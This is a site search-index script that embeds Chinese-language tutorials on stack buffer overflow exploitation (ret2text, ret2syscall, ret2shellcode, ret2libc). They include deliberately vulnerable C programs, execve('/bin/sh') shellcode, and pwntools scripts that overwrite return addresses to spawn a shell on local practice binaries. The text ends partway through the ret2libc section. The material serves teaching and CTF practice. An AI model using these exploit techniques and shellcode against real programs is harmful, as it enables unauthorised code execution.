var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(e){const s=suggestions.classList.contains("d-none");if(s)return;const t=[...suggestions.querySelectorAll("a")];if(t.length===0)return;const n=t.indexOf(document.activeElement);if(e.key==="ArrowUp"){e.preventDefault();const s=n>0?n-1:0;t[s].focus()}else if(e.key==="ArrowDown"){e.preventDefault();const s=n+1<t.length?n+1:n;t[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/exploit/stackoverflow/",title:"StackOverflow",description:"",content:""}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2text/",title:"ret2text",description:`0x01 介绍 # 栈功能 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
080483db \u0026lt;main\u0026gt;: 80483db: 55 push ebp 80483dc: 89 e5 mov ebp,esp 80483de: 83 ec 10 sub esp,0x10 80483e1: c7 45 fc 01 00 00 00 mov DWORD PTR [ebp-0x4],0x1 80483e8: c7 45 f8 02 00 00 00 mov DWORD PTR [ebp-0x8],0x2 80483ef: 90 nop 80483f0: c9 leave 80483f1: c3 ret 主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 leave 指令，该指令相当于 mov esp, ebp;pop ebp ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 ret 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。`,content:`0x01 介绍 # 栈功能 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
080483db \u0026lt;main\u0026gt;: 80483db: 55 push ebp 80483dc: 89 e5 mov ebp,esp 80483de: 83 ec 10 sub esp,0x10 80483e1: c7 45 fc 01 00 00 00 mov DWORD PTR [ebp-0x4],0x1 80483e8: c7 45 f8 02 00 00 00 mov DWORD PTR [ebp-0x8],0x2 80483ef: 90 nop 80483f0: c9 leave 80483f1: c3 ret 主要关注函数序言和函数尾声，在进入main函数之前，已经由父函数将main函数的返回地址给压入栈中，接着通过函数序言将帧指针压入栈中，并将帧指针的地址赋值给ebp，经过函数体后则进入函数尾声，尾声主要依靠 leave 指令，该指令相当于 mov esp, ebp;pop ebp ，当执行完该指令后当前栈顶就变为了main函数的返回地址，而 ret 指令的作用是跳转到当前栈顶存储的地址处继续执行（即修改eip为当前栈顶存储的那个值），这里也就是main函数的返回地址。
ret2text # 而ret2text顾名思义，就是控制 ret 指令跳转的地址（即函数返回地址）为程序里现有的 text 段代码，以达到RCE的过程。至于如何将函数返回地址给修改就需要设计到核心理念 溢出 ，超过容器本身大小的操作就叫溢出。对于C语言来说，每个变量的大小都是固定的（堆以外），学过的都知道C语言不允许动态设置数组的大小，只能是固定值，例如 char a[i] 就是错误的。这时候C语言里有些函数就会变得非常危险，这些危险函数更像是面对人而言并非对程序，比如 gets 函数，它是一个输入函数，可以将你输入的内容存进数组当中，并且只有当人输入 \\n 回车的时候才会截断输入，这样的截断对人来说是合理的，但是对于数组来说一点都不合理，对于数组来说应该是不大于数组大小的输入都是合理的，当你的输入超过数组大小则应该截断。可以 gets 函数并没有这么智能，也就是我们可以对该数组进行溢出的操作。
常见的危险函数有：
gets 函数，遇到 \\n 截断，不保留 \\n 字符串后面添加 \\x00 fgets 函数，遇到 \\n 截断，保留 \\n 并添加 \\x00 scanf 函数 %s 格式化字符串输入，遇到 \\x09 、 \\x0a 、 \\x0b 、 \\x0c 、 \\x0d 、 \\x20 截断，不保留截断字符最后添加 \\x00 sscanf 函数，和 scanf 差不多，多了个 \\x00 截断 str类函数（ strcpy 、 strcat 等）遇到 \\x00 截断，保留 \\x00 read 函数，无截断字符，不添加字符 我们之前说过如果你在函数内部声明一个变量，那么这个就是一个局部变量，存储在栈中，而局部变量邻近的位置并不是空，而是一些其他数据，这时候如果我们通过危险函数对这个局部变量进行溢出，那么我们将可以修改其他数据的内容，只要这个溢出的字节数够多，那么我们就可以修改函数返回地址。
而现有的 text 段代码的话通常会是 system(\u0026quot;/bin/sh\u0026quot;) 、 system(\u0026quot;$0\u0026quot;) 、 execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) 这种直接获取shell进程的函数调用
以一个简单的程序来讲具体实现
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void hint() { system(\u0026quot;$0\u0026quot;); } int main() { char buf[0x10]; printf(\u0026quot;input: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); return 0; } // gcc ret2text.c -o ret2text -no-pie -fno-stack-protector 做ret2text记住三大步骤：
找溢出点 计算局部变量到函数返回地址的偏移量 找getshell代码片段地址 根据危险函数列表很容易就可以找到溢出点，即scanf输入处
其次计算偏移量，用IDA有个便捷的方法来计算偏移量，双击上图中的输入变量即v4，可以看到下图
这里 var_10 即变量， s 即帧指针，而 r 则是函数返回地址，左侧的地址是相对偏移地址，右侧是每个数据占据的字节大小，可以很容易计算出变量到函数返回地址之间有16+8=24字节的偏移量
最后找getshell代码片段
你可以直接用hint函数地址，也可以只用从给system函数传递参数处的指令开始，两者结果是一样的
最后我们就可以编写攻击脚本了
from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:2,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"ret2syscall",description:`0x01 介绍 # 系统调用 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
我们可以看一下32位的系统调用号
前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
char *buf = \u0026quot;hello world\\n\u0026quot;; void main(); asm( \u0026quot;.text\\n\u0026quot; \u0026quot;.global main\\n\u0026quot; \u0026quot;main:\\n\u0026quot; // write(1, \u0026quot;hello world\\n\u0026quot;, 12) \u0026quot;mov ebx, 1\\n\u0026quot; // 第一个参数，标准输出流 \u0026quot;mov ecx, buf\\n\u0026quot; // 第二个参数，字符串地址 \u0026quot;mov edx, 12\\n\u0026quot; // 第三个参数，输出字节数 \u0026quot;mov eax, 4\\n\u0026quot; // write的系统调用号 \u0026quot;int 0x80\\n\u0026quot; // 内陷指令 ); // gcc test.c -o test -m32 -masm=intel 运行效果为`,content:`0x01 介绍 # 系统调用 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
我们可以看一下32位的系统调用号
前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
char *buf = \u0026quot;hello world\\n\u0026quot;; void main(); asm( \u0026quot;.text\\n\u0026quot; \u0026quot;.global main\\n\u0026quot; \u0026quot;main:\\n\u0026quot; // write(1, \u0026quot;hello world\\n\u0026quot;, 12) \u0026quot;mov ebx, 1\\n\u0026quot; // 第一个参数，标准输出流 \u0026quot;mov ecx, buf\\n\u0026quot; // 第二个参数，字符串地址 \u0026quot;mov edx, 12\\n\u0026quot; // 第三个参数，输出字节数 \u0026quot;mov eax, 4\\n\u0026quot; // write的系统调用号 \u0026quot;int 0x80\\n\u0026quot; // 内陷指令 ); // gcc test.c -o test -m32 -masm=intel 运行效果为
ret2syscall # 而ret2syscall它要完成的就是去调用某个系统调用来完成getshell的操作。ret2syscall作为ROP系列之一，它的核心还是溢出，不过它的难点就在于溢出后的步骤。之前的ret2text是直接返回到程序中已有的getshell代码片段，ret2syscall则没有现成的getshell代码片段出现，它获取shell的方式是通过多个代码片段之间的跳转执行，我们称这多个代码片段组成的类似于链状的执行过程称为ROP链。大概流程如下
大概来解释这幅图，首先当执行到函数的ret指令时，ret会跳转到当前栈顶指向的代码处执行，并将当前栈顶移动到下一个栈单元，这里我们将其覆盖成了修改参数寄存器代码片段的地址，接下来一段时间都会去执行修改参数寄存器的操作，直到执行到代码片段的ret指令，对于这条ret指令来说其跳转的地址就是图中第一条虚线即修改ax寄存器的代码片段的地址（应为当前栈顶就是该栈单元），接着就会去执行修改ax寄存器的代码，直到执行到其ret指令处，对于它的ret指令来说返回地址是第二条虚线即内陷指令地址，最后跳转执行内陷指令后即可获取到shell。当然实际情况可能会比这个复杂很多。
对于ret2syscall来说有几个代码片段是必须要有的，首先就是内陷指令片段，正常的程序一般不会有内陷指令，如果有内陷指令的题目大概路就是ret2syscall的方式去解决。其次就是控制ax寄存器的指令，只有控制了ax寄存器才可以设定我们想要的系统调用号。最后就是设定参数的代码片段，每个参数寄存器必须设置为指定的值，否则大概率都是执行失败。
我们以一个例子来说
#include\u0026lt;stdio.h\u0026gt; char *bin_sh = \u0026quot;/bin/sh\u0026quot;; void hint(); asm( \u0026quot;.text\\n\u0026quot; \u0026quot;.global hint\\n\u0026quot; \u0026quot;hint:\\n\u0026quot; \u0026quot;inc eax\\n\u0026quot; \u0026quot;ret\\n\u0026quot; \u0026quot;xor eax, eax\\n\u0026quot; \u0026quot;xor ebx, ebx\\n\u0026quot; \u0026quot;xor ecx, ecx\\n\u0026quot; \u0026quot;xor edx, edx\\n\u0026quot; \u0026quot;ret\\n\u0026quot; \u0026quot;int 0x80\u0026quot; ); void run() { char buf[0x10]; printf(\u0026quot;input: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); } int main() { run(); return 0; } // gcc ret2syscall.c -o ret2syscall -no-pie -fno-pic -fno-stack-protector -m32 -masm=intel 这里我们以内联汇编的方式写了一些必要的代码片段以完成ret2syscall的操作。在ret2syscall中获取shell的系统调用只有一种即 execve 系统调用，它的作用就是执行一个新的程序。execve接收三个参数，第一个参数是程序名称，第二个参数是给程序的参数，第三个参数是环境参数，对于shell来说只需要第一个参数设置为 /bin/sh 即可，后两个为null即0就行。
首先是找到修改参数寄存器的代码片段，在上面的源文件中可以很明显看到有 xor ecx, ecx; xor edx, edx 这两条指令可以完成第二、三两个参数寄存器的设置。而对于第一个参数寄存器的设置则需要通过其他指令来完成，通常寻找的是 pop ebx; ret 代码片段，该代码片段会将当前栈顶的值弹出存入到ebx中并返回下一个栈单元，如果我们在栈顶存入 /bin/sh 字符串地址则可以直接完成第一个参数寄存器的设置
所有的参数寄存器都执行完成后即可对ax寄存器进行设置，这里存在一个 inc eax; ret 代码片段，它可以对eax进行加一的操作，我们只要多次执行这个代码片段直到ax寄存器为execve系统调用号的值就行。最后既可以跳转去执行内陷指令获取shell了。所以整个的栈布局为
建议可以调试看看具体的ROP链执行过程
然后我们需要找出这些代码片段的地址，这里可以使用 ROPgadget 工具来查找
而execve的系统调用号在文件中可以查到为 11 ，通过调试我们可以知道当run函数执行到ret指令的时候eax寄存器的值为1。
所以inc指令只需要执行10次即可。最终可以写出Exploit
from pwn import* o = process(\u0026quot;./ret2syscall\u0026quot;) bin_sh = 0x8048550 # /bin/sh字符串地址 pop_ebx = 0x8048311 # pop ebx;ret代码片段地址 xor_ret = 0x8048471 # xor ecx, ecx;xor edx, edx;ret代码片段地址 int_80 = 0x8048476 # int 0x80代码片段地址 inc_eax = 0x804846b # inc eax;ret代码片段地址 payload = b'a'*28 # 填充局部变量和函数返回地址之间的空隙 payload += p32(pop_ebx) + p32(bin_sh) # 设置第一个参数寄存器 payload += p32(xor_ret) # 设置第二三个参数寄存器 payload += p32(inc_eax)*10 # eax累加到11 payload += p32(int_80) # 执行系统调用 o.sendline(payload) o.interactive() `}),e.add({id:3,href:"/docs/exploit/stackoverflow/ret2shellcode/",title:"ret2shellcode",description:`0x01 介绍 # shellcode # ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为
获取 /bin/sh 字符串地址 将字符串地址赋值给第一个参数寄存器 将第二三参数寄存器置零 将系统调用号存入ax寄存器 执行内陷指令 32位的汇编代码为
push 0x0068732f push 0x6e69622f # \u0026quot;/bin/sh\u0026quot;字符串按照小端序压入到栈中 mov ebx, esp # 当前栈顶即esp指向的是\u0026quot;/bin/sh\u0026quot;字符串，将esp的值即字符串指针赋值给ebx xor ecx, ecx # ecx置零 xor edx, edx # edx置零 mov eax, 11 # 将execve系统调用号给eax int 0x80 # 执行系统调用 64位的汇编代码为
mov rax, 0x0068732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 59 syscall 值得注意的是64位不能直接将8个字节直接push进栈里，必须借助寄存器才可以将 /bin/sh 字符串压入栈中
ret2shellcode # 将汇编编译为机器码后注入到内存里即可。在此之前需要保存注入shellcode的地方有可执行权限，最常见的情况就是没有加 NX 保护，然后可以注入到堆栈、data段bss段。还有的情况就是使用mmap申请了一个有可执行权限的内存，例如`,content:`0x01 介绍 # shellcode # ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为
获取 /bin/sh 字符串地址 将字符串地址赋值给第一个参数寄存器 将第二三参数寄存器置零 将系统调用号存入ax寄存器 执行内陷指令 32位的汇编代码为
push 0x0068732f push 0x6e69622f # \u0026quot;/bin/sh\u0026quot;字符串按照小端序压入到栈中 mov ebx, esp # 当前栈顶即esp指向的是\u0026quot;/bin/sh\u0026quot;字符串，将esp的值即字符串指针赋值给ebx xor ecx, ecx # ecx置零 xor edx, edx # edx置零 mov eax, 11 # 将execve系统调用号给eax int 0x80 # 执行系统调用 64位的汇编代码为
mov rax, 0x0068732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 59 syscall 值得注意的是64位不能直接将8个字节直接push进栈里，必须借助寄存器才可以将 /bin/sh 字符串压入栈中
ret2shellcode # 将汇编编译为机器码后注入到内存里即可。在此之前需要保存注入shellcode的地方有可执行权限，最常见的情况就是没有加 NX 保护，然后可以注入到堆栈、data段bss段。还有的情况就是使用mmap申请了一个有可执行权限的内存，例如
char *p = mmap(0x10000, 0x1000, 7, 0x22, -1, 0) 第一个参数是申请内存开始的地址，第二个参数是申请的内存大小，需要为内存分页的倍数（4KB的倍数），第三个参数是内存权限，可读为1，可写为2，可执行为4，通过或运算可以知道可读可写可执行的值为7，0x22是 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED ，代表这是一个私有的映射（别的进程不可访问），还是一个匿名映射（不和任何文件相关联），而且映射区域映射到指定的起始地址，第四个参数是文件描述符，如果是匿名映射，填-1即可，最后一个参数是指定要映射文件的偏移量，可以填0不用管
这样我们在0x10000地址处就有了一个可以写入执行shellcode的内存了
还有一种情况是通过mprotect更改内存区域的权限，例如
mprotect(0x10000, 0x1000, 7) 第一个参数是你要修改内存区域的地址，第二个参数是区域的长度，也需要是内存分页的倍数，最后一个参数是权限，和mmap的权限一样。
值得注意的是mmap和mprotect都是有系统调用存在的
我们以最简单的没加 NX 保护的情况来讲
#include\u0026lt;stdio.h\u0026gt; char buf[0x50]; void run() { char name[0x10]; printf(\u0026quot;name: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, name); printf(\u0026quot;content: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); } int main() { run(); return 0; } // gcc ret2shellcode.c -o ret2shellcode -m32 -no-pie -fno-pic -fno-stack-protector -z execstack 这里第一次输入存在栈溢出，而第二次输入是输入到buf中，buf是未初始化数组，保存在了bss段中，由于没有加PIE保护，所以buf地址是已知的，那么我们就可以将shellcode注入到buf中，然后覆盖函数返回地址为buf地址，即可通过ret跳转执行我们的shellcode
这样我们就可以写出最终的Exploit
from pwn import* context.log_level = 'debug' # 设置为调试模式 context.arch = 'i386' # 设置系统架构，要不然编译汇编代码会出错 o = process(\u0026quot;./ret2shellcode\u0026quot;) # 第一次输入，栈溢出覆盖函数返回地址为buf地址 payload = b'a'*28 + p32(0x804a040) o.sendline(payload) # execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) shellcode = ''' push 0x0068732f push 0x6e69622f push esp pop ebx xor ecx, ecx xor edx, edx mov eax, 59 xor eax, 48 # 由于11是scanf的截断字符，所以通过先将eax赋值为59，再将eax和48异或eax即可得到11 int 0x80 ''' payload = asm(shellcode) # 编译汇编代码 o.sendline(payload) # 将编译好的机器码写入到buf中 o.interactive() 建议调试看看具体过程
`}),e.add({id:4,href:"/docs/exploit/stackoverflow/ret2libc/",title:"ret2libc",description:`0x01 介绍 # 动态链接 # 我们一般gcc编译不加 -static 的话默认就是动态链接，动态链接就是不将代码嵌入到你的程序中，而是等程序运行时再链接到动态链接库，从而减小程序的大小。我们可以对比以下动态和静态的区别
#include\u0026lt;stdio.h\u0026gt; int main() { puts(\u0026quot;hello world\\n\u0026quot;); return 0; } // 动态链接: gcc test.c -o test // 静态链接: gcc test.c -o test_static -static 静态链接的话会把很多我们用不到的函数也给添加到程序中
静态编译的程序在内存中的布局为除了程序本身并没有其他的东西
而动态链接的话只有两个动态链接库的函数存留（而且保留的不是函数的代码，而是函数的符号）
在内存中的布局多了一个libc即动态链接库和ld链接器
相对而言的话，静态链接跳转执行函数的方式更简单点，因为地址都是确定的，直接跳转过去就可以执行。但是动态链接不行，因为动态链接库加载到内存中的地址是不固定的（有些情况下会固定，视情况而定），这就导致我们无法直接跳转到动态链接库中执行函数。动态链接库采用了一个名为 动态延迟绑定 的方法来解决这个问题的。动态延迟绑定简单解释就是只有当程序调用到需要的函数时程序才会去解析获取到函数的地址。这样一方面提高了程序的安全性（不知道函数的实际地址），另一方面也提高了效率（一些不需要的函数就不用解析出来）。动态延迟绑定主要和两个程序节有关，一个是 .plt ，还有一个是 .got.plt ，前者是过程链接表，当我们使用call指令调用函数的时候首先会跳转到 .plt 节
这里是puts函数的plt，它里面是一个跳转指令，跳转地址为puts函数的got表中存储的值（虽然程序中 .got 节也叫做全局偏移表，但是由于其只能在程序加载时固定值，并且之后都不可修改，不符合最新的安全性，所以弃用了，所以 .got.plt 可以直接称为got表）， .got.plt 称为全局偏移量表，在没有调用函数前其值初始化为plt表中的地址，这个地址 处的指令为上图的下一条地址的指令
push 0 的作用是把puts函数在got表中的位置压入栈中（这个位置其实是got表的第4个数据，在此之前还有三个数据是用来辅助解析地址的，默认保留），jmp指令则是跳转到plt中的一个代码段
第一个push是将 got表默认保留的第二个数据压入栈中，第二个数据是一个执行link_map结构体链的指针，每个link_map记录了一个动态链接库的信息。然后jmp指令会跳转到got表默认保留的第三个数据，这个数据是动态链接器 _dl_runtime_resolve() 的地址，经过动态链接器解析后，函数的got表就会被修改为其实际地址。之后再次调用该函数的时候就不会再次解析而是直接跳转到动态链接库中执行函数。
从以上可以得知plt表和got表的结构如下：
调用约定 # 知道了动态链接是怎么回事后再来看看如何调用这些函数的。这里就涉及到 调用约定 这个知识，调用约定是指在调用函数时如何传递参数、如何返回值以及如何进行栈帧的管理等一系列的约定。32位最常用的调用约定是 cdecl 调用约定，该调用约定指明参数从右往左依次压入栈中，返回值存入eax寄存器中，由调用者清理栈上的参数，例如我们写一个printf例子
printf(\u0026quot;%d, %d, %d\\n\u0026quot;, 1, 2, 3); 生成的汇编为`,content:`0x01 介绍 # 动态链接 # 我们一般gcc编译不加 -static 的话默认就是动态链接，动态链接就是不将代码嵌入到你的程序中，而是等程序运行时再链接到动态链接库，从而减小程序的大小。我们可以对比以下动态和静态的区别
#include\u0026lt;stdio.h\u0026gt; int main() { puts(\u0026quot;hello world\\n\u0026quot;); return 0; } // 动态链接: gcc test.c -o test // 静态链接: gcc test.c -o test_static -static 静态链接的话会把很多我们用不到的函数也给添加到程序中
静态编译的程序在内存中的布局为除了程序本身并没有其他的东西
而动态链接的话只有两个动态链接库的函数存留（而且保留的不是函数的代码，而是函数的符号）
在内存中的布局多了一个libc即动态链接库和ld链接器
相对而言的话，静态链接跳转执行函数的方式更简单点，因为地址都是确定的，直接跳转过去就可以执行。但是动态链接不行，因为动态链接库加载到内存中的地址是不固定的（有些情况下会固定，视情况而定），这就导致我们无法直接跳转到动态链接库中执行函数。动态链接库采用了一个名为 动态延迟绑定 的方法来解决这个问题的。动态延迟绑定简单解释就是只有当程序调用到需要的函数时程序才会去解析获取到函数的地址。这样一方面提高了程序的安全性（不知道函数的实际地址），另一方面也提高了效率（一些不需要的函数就不用解析出来）。动态延迟绑定主要和两个程序节有关，一个是 .plt ，还有一个是 .got.plt ，前者是过程链接表，当我们使用call指令调用函数的时候首先会跳转到 .plt 节
这里是puts函数的plt，它里面是一个跳转指令，跳转地址为puts函数的got表中存储的值（虽然程序中 .got 节也叫做全局偏移表，但是由于其只能在程序加载时固定值，并且之后都不可修改，不符合最新的安全性，所以弃用了，所以 .got.plt 可以直接称为got表）， .got.plt 称为全局偏移量表，在没有调用函数前其值初始化为plt表中的地址，这个地址 处的指令为上图的下一条地址的指令
push 0 的作用是把puts函数在got表中的位置压入栈中（这个位置其实是got表的第4个数据，在此之前还有三个数据是用来辅助解析地址的，默认保留），jmp指令则是跳转到plt中的一个代码段
第一个push是将 got表默认保留的第二个数据压入栈中，第二个数据是一个执行link_map结构体链的指针，每个link_map记录了一个动态链接库的信息。然后jmp指令会跳转到got表默认保留的第三个数据，这个数据是动态链接器 _dl_runtime_resolve() 的地址，经过动态链接器解析后，函数的got表就会被修改为其实际地址。之后再次调用该函数的时候就不会再次解析而是直接跳转到动态链接库中执行函数。
从以上可以得知plt表和got表的结构如下：
调用约定 # 知道了动态链接是怎么回事后再来看看如何调用这些函数的。这里就涉及到 调用约定 这个知识，调用约定是指在调用函数时如何传递参数、如何返回值以及如何进行栈帧的管理等一系列的约定。32位最常用的调用约定是 cdecl 调用约定，该调用约定指明参数从右往左依次压入栈中，返回值存入eax寄存器中，由调用者清理栈上的参数，例如我们写一个printf例子
printf(\u0026quot;%d, %d, %d\\n\u0026quot;, 1, 2, 3); 生成的汇编为
804841c: 6a 03 push 0x3 804841e: 6a 02 push 0x2 8048420: 6a 01 push 0x1 8048422: 68 c4 84 04 08 push 0x80484c4 8048427: e8 b4 fe ff ff call 80482e0 \u0026lt;printf@plt\u0026gt; 执行printf时的栈结构为
call指令相当于 push $eip+1; jmp prinitf 这两条指令的集合。
而对于64位程序来说常用的调用约定是 System V AMD64 ABI ，该调用约定规定了函数的参数前6个参数由寄存器传递，这六个参数寄存器顺序为 rdi、rsi、rdx、rcx、r8、r9 ，如果超过六个参数则由栈进行传递，返回值存入rax，栈的管理由调用方管理，还是一个printf例子来讲
printf(\u0026quot;%d, %d, %d, %d, %d, %d\\n\u0026quot;, 1, 2, 3, 4, 5, 6); 汇编代码为
40052e: 6a 06 push 0x6 400530: 41 b9 05 00 00 00 mov r9d,0x5 400536: 41 b8 04 00 00 00 mov r8d,0x4 40053c: b9 03 00 00 00 mov ecx,0x3 400541: ba 02 00 00 00 mov edx,0x2 400546: be 01 00 00 00 mov esi,0x1 40054b: bf f8 05 40 00 mov edi,0x4005f8 400550: b8 00 00 00 00 mov eax,0x0 400555: e8 a6 fe ff ff call 400400 \u0026lt;printf@plt\u0026gt; 可以对比看看
ret2libc1 # 有了这两个知识后就可以来学习ret2libc的利用方式了。ret2libc分为三种情况，第一种最简单的为程序里有 /bin/sh 字符串和system函数，但是并没有 system(\u0026quot;/bin/sh\u0026quot;); 直接获取shell的代码片段，这时候就需要你自己调用system函数并给它传递参数来获取shell，主要思路就是覆盖函数返回地址为system函数，可以是 call system ，也可以直接为system的plt表。两者区别在于前者的call指令会自动压入函数返回地址后再跳转去system的plt表，而后者不会自动添加函数返回地址，如果我们不给后者添加函数返回地址，那么它的参数就会错位（对于64位来说影响没32位大，因为64位参数大部分都是靠寄存器）
我们分别以32位和64位的来说
#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char *p = \u0026quot;/bin/sh\u0026quot;; void hint() { system(\u0026quot;echo hello\u0026quot;); } void run() { char buf[0x10]; gets(buf); } int main() { run(); return 0; } // x32: gcc ret2libc1.c -o ret2libc1_32 -fno-stack-protector -no-pie -fno-pic -m32 // x64: gcc ret2libc1.c -o ret2libc1_64 -fno-stack-protector -no-pie -fno-pic ret2libc1 x32 # call system地址为
system的plt表地址是
/bin/sh 字符串地址为
如果是用call的话，栈覆盖后的结构应该如下
当执行到run函数的ret指令后会跳转到 call system ，对于 call system 来说传递给system的参数就是下一个栈单元的字符串地址，然后执行call指令，将system函数的函数返回地址压入栈中，再去执行system函数，也就变为了如下的结构
而如果直接覆盖run函数的函数返回地址为system的plt表的话，栈结构则是如下
相比较与call指令来说，我们可以更容易控制system执行完后的程序流，当执行到run函数的ret指令后，整个栈结构为
其实就是少了push函数返回地址的步骤。最后我们就可以写出Exploit
from pwn import* o = process(\u0026quot;./ret2libc1_32\u0026quot;) call_system = 0x8048449 bin_sh = 0x8048510 payload = b'a'*28 payload += p32(call_system) # 覆盖函数返回地址为call system地址 payload += p32(bin_sh) # 给call system的参数 o.sendline(payload) o.interactive() ret2libc1 x64 # 对比32位就是参数的问题，它需要把参数传递给寄存器才行，所以需要去搜索可用的gadget先设置参数，再调用system。最常用的gadget就是 pop rdi;ret 指令，栈结构为
执行流程为先执行pop rdi将字符串地址弹如rdi寄存器中，然后执行ret指令跳转执行system函数，对于这里来说，call system和system的plt都不影响参数的设置，所以随便哪个都行可以不用管函数返回地址，脚本为
